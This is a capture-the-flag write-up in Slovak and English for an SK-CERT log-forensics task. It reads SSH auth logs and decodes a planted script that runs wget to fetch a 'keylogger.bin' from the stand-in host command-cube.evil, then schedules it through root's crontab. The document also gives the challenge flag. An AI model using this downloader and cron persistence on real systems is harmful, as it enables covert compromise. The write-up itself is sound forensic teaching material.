# Zadanie

EN: A routine inspection of authentication logs reveals an overwhelming pattern of suspicious access attempts to a dockerized SSH bastion server. Inspect the logs and look for any unordinary activity.

SK: Rutínna kontrola prístupových logov viedla k odhaleniu k nezvyčajne zvýšenému počtu pokusov o prihlásenie do dokerizovaného SSH servera. Skontrolujte, či sa bol systém kompromitovaný.

**Súbory:**

- part1_toolbox_logs.tar.gz

## Riešenie

Stačilo rozbaliť archív a prehľadať logy, zas tak veľa toho nebolo. po rozbaleni `auth.log.4.gz` a otvoreni `auth.log.4` tam svietilo 

```log
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/hostname
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/sbin/ip a
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/cat /etc/passwd
Apr 18 15:34:49 a952d0d9ca03 sshd[2681]: Failed password for invalid user magcpt from 172.30.185.18 port 54804 ssh2
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/base64 -d
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/echo IyEvYmluL3NoCmJlYWNvbj0iNjkyMDY4NmY3MDY1MjA3NDY4NjU3OTIwNzc2ZjZlNzQyMDY2Njk2ZTY0MjA2ZDY1MmMyMDYxNmU2NDIwNzQ2ODY5NzMyMDY2NmM2MTY3MjAyODUzNGIyZDQzNDU1MjU0N2I2ZTMzNzYzMzcyNWY2NjMwNzIzNjMzMzc1ZjM0NjIzMDc1Mzc1ZjY0MzQzNzVmNzAzMzcyMzUzMTM1MzczMzZlNjMzMzdkMjkyMDZiNjU2NTcwNzMyMDZmNmUyMDYyNjU2MTYzNmY2ZTY5NmU2NyIKZWNobyAiWyQoZGF0ZSldICQoZWNobyAkYmVhY29uIHwgeHhkIC1yIC1wKSIgPiAvdG1wL3BlcnNpc3RlbmNlCm1rZGlyIC1wIC92YXIvZGF0YQp3Z2V0IC1PIC92YXIvZGF0YS9rZXlsb2dnZXIuYmluICJodHRwOi8vY29tbWFuZC1jdWJlLmV2aWwva2V5bG9nZ2VyLmJpbiIK
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/usr/bin/tee /usr/local/bin/insider.sh
Apr 18 15:34:49 a952d0d9ca03 sshd[2681]: Connection closed by invalid user magcpt 172.30.185.18 port 54804 [preauth]
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/usr/bin/tee -a /etc/crontabs/root
Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/echo '0 * * * * /usr/local/bin/insider.sh'
```

je tam base64 string, ktorý po dekódovaní ukazuje toto

```
beacon="6920686f7065207468657920776f6e742066696e64206d652c20616e64207468697320666c61672028534b2d434552547b6e337633725f6630723633375f34623075375f6434375f70337235313537336e63337d29206b65657073206f6e20626561636f6e696e67"
echo "[$(date)] $(echo $beacon | xxd -r -p)" > /tmp/persistence
mkdir -p /var/data
wget -O /var/data/keylogger.bin "http://command-cube.evil/keylogger.bin"
```

a hex string, ktorý po vykonaní príkazu 

```bash
echo 6920686f7065207468657920776f6e742066696e64206d652c20616e64207468697320666c61672028534b2d434552547b6e337633725f6630723633375f34623075375f6434375f70337235313537336e63337d29206b65657073206f6e20626561636f6e696e67 | xxd -r -p
```

ukazuje toto

```
i hope they wont find me, and this flag (SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}) keeps on beaconing
```

## Vlajka

```
SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}
```
